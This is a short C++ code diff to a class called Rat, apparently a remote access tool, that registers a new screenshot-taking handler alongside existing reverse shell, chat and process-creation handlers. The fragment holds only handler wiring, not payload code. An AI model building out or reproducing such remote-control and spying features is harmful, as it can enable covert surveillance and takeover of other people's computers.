@@ -3,6 +3,7 @@
 #include "ChatHandler.h"
 #include "CreateProcessHandler.h"
 #include "ReverseShellHandler.h"
+#include "TakeScreenshotHandler.h"
 #include "Trace.h"
 
 Rat::Rat(
@@ -34,6 +35,7 @@ std::map<MessageType, std::shared_ptr<IMessageHandler>> Rat::GetHandlers()
 		{ MessageType::StartReverseShell, reverseShellHandler },
 		{ MessageType::StopReverseShell, reverseShellHandler },
 		{ MessageType::ReverseShellMessage, reverseShellHandler },
+		{ MessageType::TakeScreenshot, std::make_shared<TakeScreenshotHandler>(_sender.get())},
 	};
 }
 
